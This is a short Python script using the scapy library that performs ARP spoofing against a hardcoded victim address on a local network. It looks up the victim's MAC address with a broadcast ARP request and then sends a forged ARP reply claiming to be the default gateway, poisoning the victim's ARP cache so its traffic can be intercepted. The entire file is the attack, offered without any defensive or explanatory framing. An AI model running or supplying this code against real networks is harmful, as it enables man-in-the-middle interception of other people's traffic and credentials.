from scapy.all import ARP, Ether, srp, send

IP_adress = "192.168.1.187"
default_gateway = "192.168.1.1"

def get_MAC_adress():
    global IP_adress
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP_adress)
    answered, unanswered = srp(request, timeout=2, verbose=False)
    MAC_adress = answered[0][1].hwsrc
    return MAC_adress

def spoof():
    global IP_adress
    victim_MAC = get_MAC_adress()
    packet = ARP(op=2, pdst=IP_adress, hwdst=victim_MAC, psrc=default_gateway)
    send(packet, verbose=False)
